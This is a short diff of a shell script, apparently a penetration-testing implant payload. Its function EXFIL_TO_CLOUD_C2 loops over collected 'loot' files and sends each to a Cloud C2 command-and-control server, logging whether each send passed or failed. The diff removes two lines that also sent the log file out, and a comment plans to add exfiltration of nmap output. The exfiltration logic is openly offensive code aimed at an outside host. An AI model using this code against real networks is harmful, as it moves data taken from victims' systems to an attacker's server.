@@ -483,8 +483,6 @@ function EXFIL_TO_CLOUD_C2() {
 				LOOT_FILE_DESC=${LOOT_FILE_DESC^^}
 				C2EXFIL STRING $LOOT_FILE $LOOT_FILE_DESC && echo "Exfiltration of $LOOT_FILE to Cloud C2 has passed" >> $LOG_FILE || echo "Exfiltration of $LOOT_FILE to Cloud C2 has failed" >> $LOG_FILE
 			done
-			LOG_FILE_DESC=$SCAN_COUNT-$TODAY-LOGFILE
-			C2EXFIL STRING $LOG_FILE $LOG_FILE_DESC && echo "Exfiltration of $LOG_FILE to Cloud C2 has passed" >> $LOG_FILE || echo "Exfiltration of $LOG_FILE to Cloud C2 has failed" >> $LOG_FILE
 			
 			### Add exfiltration of nmap -oA files
                         ## XML
